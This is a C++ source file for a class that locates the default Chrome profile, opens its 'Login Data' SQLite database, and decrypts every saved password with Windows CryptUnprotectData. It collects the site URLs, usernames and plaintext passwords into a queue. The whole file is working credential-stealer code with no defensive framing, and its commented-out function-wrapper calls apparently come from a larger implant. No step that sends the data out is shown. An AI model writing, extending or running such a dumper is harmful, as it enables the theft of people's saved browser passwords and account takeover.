#include "stdafx.h"
#include "CChrome.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <userenv.h>
#include <shlobj.h>
#include <Wincrypt.h>
#include <queue>
#include "../SQLite/sqlite3.h"

using namespace std;
#pragma comment(lib,"userenv.lib")
#pragma comment(lib, "Crypt32")

#ifdef _DEBUG
#	pragma comment(lib, "../SQlite/SQLite3_D.lib")
#else
#	pragma comment(lib, "../SQlite/SQLite3.lib")
#endif //_DEBUG

CChrome::CChrome()
{
}

CChrome::~CChrome()
{
}

int CChrome::DirectoryExists(wchar_t *path)
{
    DWORD attr = GetFileAttributesW(path);
	
	if (!path)
		return 0;

	if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) ) 
		return 0;
    
    return 1;
}

char *CChrome::GetDosAsciiName(wchar_t *orig_path)
{
	char *dest_a_path;
	wchar_t dest_w_path[_MAX_PATH + 2];
	DWORD mblen;

	memset(dest_w_path, 0, sizeof(dest_w_path));
	//if (!FNC(GetShortPathNameW)(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (wchar_t))-1))
	if (!GetShortPathNameW(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (wchar_t))-1))
		return NULL;

	//if ( (mblen = FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
	if ( (mblen = WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
		return NULL;

	if ( !(dest_a_path = (char *)malloc(mblen)) )
		return NULL;

	//if ( FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
	if ( WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
		free(dest_a_path);
		return NULL;
	}

	return dest_a_path;
}

char *CChrome::HM_CompletePath(char *file_name, char *buffer)
{
	_snprintf_s(buffer, _MAX_PATH, _TRUNCATE, "%s",file_name);
	return buffer;
}

int CChrome::DecryptPass(char *cryptData, wchar_t *clearData, int clearSize)
{
	DATA_BLOB input;
	input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cryptData));
	DATA_BLOB output;
	DWORD blen;

	for(blen=128; blen<=2048; blen+=16) {
		input.cbData = static_cast<DWORD>(blen);
		//if (FNC(CryptUnprotectData)(&input, NULL, NULL, NULL, NULL, 0, &output))
	    if(CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output))
			break;
	}
	if (blen>=2048)
		return 0;

	CHAR *decrypted = (CHAR *)malloc(clearSize);
	if (!decrypted) {
		LocalFree(output.pbData);
		return 0;
	}

	memset(decrypted, 0, clearSize);
	memcpy(decrypted, output.pbData, (clearSize < output.cbData) ? clearSize - 1 : output.cbData);

	_snwprintf_s(clearData, clearSize, _TRUNCATE, L"%S", decrypted);

	free(decrypted);
	LocalFree(output.pbData);

	return 1;
}

int CChrome::parse_chrome_signons(void *param, int argc, char **argv, char **azColName)
{
	CChrome* pThis = (CChrome*)param;
	struct chp_entry chentry;
	struct get_Chrome getchrometemp;
	ZeroMemory(&chentry, sizeof(chentry));
	ZeroMemory(&getchrometemp, sizeof(getchrometemp));

	for(int i=0; i<argc; i++){
		if (!strcmp(azColName[i], "origin_url")) {
			swprintf_s(chentry.service, 255, L"Chrome");
			_snwprintf_s(chentry.resource, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "username_value")) {
			_snwprintf_s(chentry.user_value, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "password_value")) {
			pThis->DecryptPass(argv[i], chentry.pass_value, 255);
		}
	}
	//(chentry.service, chentry.resource, chentry.user_value, chentry.pass_value);
	wcscpy_s(getchrometemp.pass_name,chentry.pass_value);
	wcscpy_s(getchrometemp.url,chentry.resource);
	wcscpy_s(getchrometemp.user_name,chentry.user_value);
	pThis->pCH.push(getchrometemp);
	return 0;
}

int CChrome::DumpSqlCH(wchar_t *profilePath, wchar_t *signonFile)
{
	sqlite3 *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
	if (ascii_path) {
		free(ascii_path);
	}

	if ((rc = sqlite3_open(sqlPath, &db)))
		return 0;
	int nResult = sqlite3_exec(db, "SELECT * FROM logins;", parse_chrome_signons, this, NULL);

	sqlite3_close(db);

	return 1;
}

wchar_t *CChrome::GetCHProfilePath()
{
	wchar_t appPath[MAX_PATH];
	static wchar_t FullPath[MAX_PATH];

	memset(appPath, 0, sizeof(appPath));
	//if (!FNC(SHGetSpecialFolderPathW)(NULL, appPath, CSIDL_LOCAL_APPDATA, TRUE))
	if (!SHGetSpecialFolderPathW(NULL, appPath, CSIDL_LOCAL_APPDATA, TRUE))
		return NULL;

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Google\\Chrome\\User Data\\Default", appPath);

	return FullPath;
}

int CChrome::DumpChrome(void)
{
	wchar_t *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetCHProfilePath();

	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;

	DumpSqlCH(ProfilePath, L"Login Data"); 

	return 0;
}
